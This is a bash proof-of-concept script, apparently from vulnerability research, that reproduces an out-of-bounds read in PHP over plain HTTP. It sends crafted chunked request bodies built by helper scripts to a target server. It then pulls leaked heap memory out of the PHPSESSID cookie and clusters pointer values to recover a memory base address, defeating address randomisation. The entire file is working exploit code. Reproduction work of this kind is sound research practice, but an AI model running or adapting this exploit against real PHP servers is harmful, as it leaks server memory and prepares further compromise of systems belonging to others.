#!/bin/bash
# Pure-HTTP reproduction of the 128M display_errors=Off OOB read (no gdb).
# Assumes the target container is up (see run_pure.sh).
#
# usage: ./repro_pure.sh [PORT] [FAKE_LEN] [NFIELDS]
set -eu

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
R=$(cd "$HERE/.." && pwd)
PORT=${1:-18110}
FAKE_LEN=${2:-0x2000}
NFIELDS=${3:-24}
Q="?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

python3 "$HERE/mk_a1.py" --out "$TMP/a.bin" --big 78
echo "--- A (expect 500)"
python3 "$HERE/chunked_send.py" --port "$PORT" --body-file "$TMP/a.bin" \
  --path "/index.php$Q" --timeout 120

SPEC=$(python3 -c "print(','.join(['A:0x137']*$NFIELDS))")
python3 "$HERE/mk_leak_b.py" --out "$TMP/b.bin" --spec "$SPEC" \
  --fake-len "$FAKE_LEN" --tag
echo "--- B (expect 200 + Set-Cookie)"
python3 "$HERE/chunked_send.py" --port "$PORT" --body-file "$TMP/b.bin" \
  --timeout 400 --save-response "$TMP/b.resp"

python3 - "$TMP/b.resp" <<'PY'
import sys, urllib.parse, struct
from collections import Counter
raw = open(sys.argv[1], "rb").read()
i = raw.find(b"Set-Cookie: PHPSESSID=")
if i < 0:
    print("no Set-Cookie; response %d bytes" % len(raw))
    raise SystemExit(1)
v = raw[i+len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
dec = urllib.parse.unquote_to_bytes(v.decode("latin1"))
print("decoded_len=%d head=%r" % (len(dec), dec[:24]))
c = Counter()
for off in range(0, len(dec) - 8, 8):
    q = struct.unpack_from("<Q", dec, off)[0]
    if 0x7f0000000000 <= q <= 0x7fffffffffff:
        c[q & ~0x1fffff] += 1
print("pointer clusters:", [(hex(k), n) for k, n in c.most_common(4)])
if c:
    print("id chunk base = %s" % hex(c.most_common(1)[0][0]))
PY
